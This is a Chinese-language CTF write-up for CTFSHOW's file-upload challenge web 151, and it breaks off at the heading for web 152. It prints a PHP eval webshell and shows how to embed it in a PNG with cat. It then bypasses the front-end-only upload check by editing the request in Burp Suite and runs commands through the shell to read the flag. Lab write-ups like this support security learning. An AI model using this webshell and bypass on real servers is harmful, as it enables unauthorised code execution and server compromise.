---
description: >-
  这里直接展示自己刷题的题解了，怎么办，已经坚持不了继续写知识点总结了，想疯狂刷题了，写知识点真的好难受，单纯的写总结，好累啊，比做题还累，/(ㄒoㄒ)/~~。
---

# 🚗 CTFSHOW文件上传web入门

## <mark style="color:green;background-color:blue;">（1）web 151</mark>

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

这里只放了关键性的代码，其实我最开始的时候没看到这个地方，他上面写了，accept的类型是png后缀的images，我最开始找的是jpg，我真服了。

### <mark style="color:green;">②思路解释：</mark>

其实他已经提示了是前台校验，所以我们直接用前端校验的解决方法。他要求是上传的图片，我们可以写一个一句话木马，然后直接修改他的js代码。

一句话木马：

```php
<?php
@eval($_POST['a']);
?>

```

然后生成图片马。图片马的生成在编写一句话木马的专栏里面有讲到，这里放一个传送门  [#id-3-sheng-cheng-tu-pian-ma](../lfi-he-rfl-wen-jian-bao-han-lou-dong/编写一句话木马.md#id-3-sheng-cheng-tu-pian-ma "mention")

这里放一张png后缀的图片吧，懒得让大家去找了。

<figure><img src="../.gitbook/assets/raw.png" alt=""><figcaption></figcaption></figure>

```sh
cat raw.png 1.php > shell.png 
```

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

然后我们将这个图片马上传上去.然后用burpsuite将传上去的这个包抓下来。

<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

因为他是前台校验，能上传成功就说明已经通过校验了，但是我们要上传的其实是我们的1.php（也就是我们的木马文件），所以我们要将我们上传的内容修改一下。我们要修改文件名，是我们的1.php，还要修改上传的内容，把png的部分删掉，留下我们的木马部分的代码。

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

出现200说明我们上传成功了，并且还有到了upload/1.php。

然后我们关闭bp，可以再send一下来再发一次以防万一。然后查看/upload/1.php文件，来确定是否真的传上去了。我们这里是空白，没有出现404，说明成功了。

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

现在我们已经getshell了，我们就传入我们的指令查看文件内容目录之类的就行了。

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

最开始我还在想怎么没有flag.php,后来才意识到这是upload下面，我得到上一级目录下去看。

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

然后在上一级目录看到了flag.php,然后查看此文件（记住我们还是在upload目录下）

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:green;">（2）web 152</mark>













































